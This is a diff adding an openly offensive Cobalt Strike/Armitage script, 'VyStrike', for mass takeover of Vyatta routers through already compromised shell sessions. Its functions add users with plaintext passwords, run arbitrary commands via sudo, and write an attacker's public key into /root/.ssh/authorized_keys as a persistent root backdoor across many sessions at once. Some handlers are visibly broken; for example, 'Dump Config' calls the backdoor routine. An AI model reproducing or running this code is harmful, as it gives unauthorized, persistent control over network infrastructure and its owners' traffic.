@@ -1,0 +1,272 @@
+
+# VyStrike - Cobalt Stike module for mass Vyatta Router owning! 
+#
+#
+# Author: @dubhack
+#
+#global('@vys $beg $end $table');
+$beg = "sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper begin;sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper ";
+$end = "sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper commit;sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper save;sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper end;";
+@vys = @();
+
+#====================
+#  Events
+#====================
+on ready{
+	@vys = data_list("vys")[0];
+	if(!@vys){
+	        @vys = @();
+	}	
+	vyatta_tab();
+}
+
+on session_close {
+	refresh_tab_table();
+}
+
+on session_open {
+
+	refresh_tab_table();
+}
+#====================
+#  Command Builder Subs
+#====================
+
+sub add_user_cmd {
+	$vcmd = "$beg set system login user $1 authentication plaintext-password $2\; $end";
+	return $vcmd;
+}
+
+sub remove_user_cmd {
+	$vcmd = "$beg delete system login user $1\;$end";
+	return $vcmd;
+}
+
+sub generic_cmd {
+	$vcmd = "$beg $1\;$end";
+	return $vcmd;
+}
+
+#====================
+#  Execute Command Subs
+#====================
+sub add_user {
+	local('$sess_id $username $password');
+	$sess_id = $1;
+	$username = $2;
+	$password = $3;
+	if(-isshell $sess_id){
+		s_cmd($sess_id,add_user_cmd($username , $password));
+		println ("[*] added $username : $password on session $sess_id !");
+	}
+	else {
+		println ("[!] $sess_id is not a valid shell session!");
+	}		
+
+}
+
+sub remove_user {
+	local('$sess_id $username');
+	$sess_id = $1;
+	$username = $2;
+	if(-isshell $sess_id){
+		s_cmd($sess_id,remove_user_cmd($username , $password));
+		println ("[*] removed $username on session $sess_id !");
+	}
+	else {
+		println ("[!] $sess_id is not a valid shell session!");
+	}
+}
+
+sub run_cmd {
+	local('$sess_id $user_cmd');
+	$sess_id = $1;
+	$user_cmd = $2;
+	if(-isshell $sess_id){
+		s_cmd($sess_id, generic_cmd($user_cmd));
+		println ("[*] ran command on session $sess_id !");
+	}
+	else {
+		println ("[!] $sess_id is not a valid shell session!");
+	}	
+}
+
+sub backdoor_key {	
+	local('$sess_id $pubkey');
+	$sess_id = $1;
+	$pubkey = $2;
+	if(-isshell $sess_id){
+		s_cmd($1, "mkdir /root/.ssh");
+		s_cmd($1, "echo $pubkey > /root/.ssh/authorized_keys");
+		println ("[*] backdoor root ssh key added on $sess_id !");
+	}
+	else {
+		println ("[!] $sess_id is not a valid shell session!");
+	}
+
+}
+
+sub add_vy {
+	local('$session $addr $sessiondata $alreadythere');
+	$addr = $1;
+	$session = host_session($1);
+	$sessiondata = $null;
+	$alreadythere = 0;
+
+	#mark this host as a vyatta
+	host_os($addr, "Firewall", "Vyatta");
+
+	#push the session id, host address, label, and session info onto our table!
+	if($session ne $null){
+		$sessiondata = session_data($session)["info"];
+	}
+
+	#Check to make sure host isnt already in our list
+	$newval = @($addr, $session,host_info($addr, "label"), $sessiondata);
+	foreach $row (@vys){
+		if($row[0] eq $newval[0]){
+			$alreadythere = 1;
+		}
+	}
+	if($alreadythere != 1){
+		push(@vys, $newval);
+	}
+	refresh_tab_table();
+}
+
+#====================
+#  GUI Subs & Events
+#====================
+sub vyatta_tab {
+	local('@vy @tablevy');
+
+	@tablevy = @();
+	foreach @vy (@vys) {
+		push (@tablevy, %(host => @vy[0], session => @vy[1], label => @vy[2], info => @vy[3]));
+	}
+	$table = open_table_tab("Vyatta Routers", $null,
+		@('host', 'session', 'label', 'info'),										#cols
+		@tablevy,													#rows
+		@("Refresh", "Remove", "Add User","Remove User", "Run Command", "Dump Config", "Backdoor Root Key"),		#buttons	
+		"vytab_menu",													#handler
+		1);														#yes multi
+}
+
+on tab_table_click {
+
+	if ($3 eq "Refresh") {
+		refresh_tab_table();
+	}
+	if ($3 eq "Remove") {
+		foreach $row (table_selected($table,'host', 'session', 'label', 'info')){
+			foreach $vy (@vys) {
+			        if ($vy[0] eq $row [0]){;
+					remove();
+					println("[!] Removed Vyatta $row[0]!"); 
+		        	}
+    			}	
+		}
+		refresh_tab_table();
+	}
+	if ($3 eq "Add User") {
+		$un = prompt_text("Username:");
+		$pass = prompt_text("Plaintext Password:");
+		foreach $row (table_selected($table, "session")){
+			add_user($row[0], $un, $pass);
+		}
+	}
+	if ($3 eq "Remove User") {
+		$un = prompt_text("Username:");
+		foreach $row (table_selected($table, "session")){
+			remove_user($row[0], $un);
+		}
+	}
+	if ($3 eq "Run Command") {
+		$cmd = prompt_text("Command:");
+		foreach $row (table_selected($table, "session")){
+			run_cmd($row[0], $cmd);
+		}
+	}
+	if ($3 eq "Backdoor Root Key") {
+		$keyname = prompt_file_open("SSH Key");
+		$handle = openf($keyname);
+		$pub_key = readln($handle);
+		closef($handle);
+		foreach $row (table_selected($table, "session")){
+			backdoor_key($row[0], $pub_key);
+		}
+	}
+	if ($3 eq "Dump Config") {
+		foreach $row (table_selected($table, "session")){
+			backdoor_key($row[0], $pub_key);
+		}
+	}	
+
+}
+
+sub refresh_tab_table {
+	local('@vy @tablevy');
+	data_clear("vys");
+
+	#verify session state
+	foreach @vy (@vys) {
+		$session = host_session(@vy[0]);
+		if(@vy[1] ne $session) {
+			if ( $session eq $null) {
+				@vy[1] = $null;
+				@vy[3] = $null;
+			}
+			else {
+				@vy[1] = $session;
+				@vy[3] = session_data($session)["info"];
+			}
+		}
+	}
+
+	data_add("vys",@vys);
+
+	@tablevy = @();
+	foreach @vy (@vys) {
+		push (@tablevy, %(host => @vy[0], session => @vy[1], label => @vy[2], info => @vy[3]));
+	}
+	table_update($table, @tablevy);
+}
+#====================
+#  Cortana Commands
+#====================
+command vylist {
+    local('$vy');
+    if (size(@vys) == 0) {
+        println("[!] No Vyattas Marked");
+    }
+    else{
+        println("[*] Vyatta Hosts:");
+        foreach $vy (@vys){
+            println("   $vy");
+        } 
+    }
+}
+command vyclear {
+	clear(@vys);
+	refresh_tab_table();
+}
+
+#====================
+#  Menus
+#====================
+
+popup main_middle {
+	item "Vyatta Tab"{
+		vyatta_tab();
+	}
+}
+popup vytab_menu {
+	
+}
+popup host_bottom{
+	item "Mark as Vyatta"{
+		add_vy($1);
+	}
+}
+
+
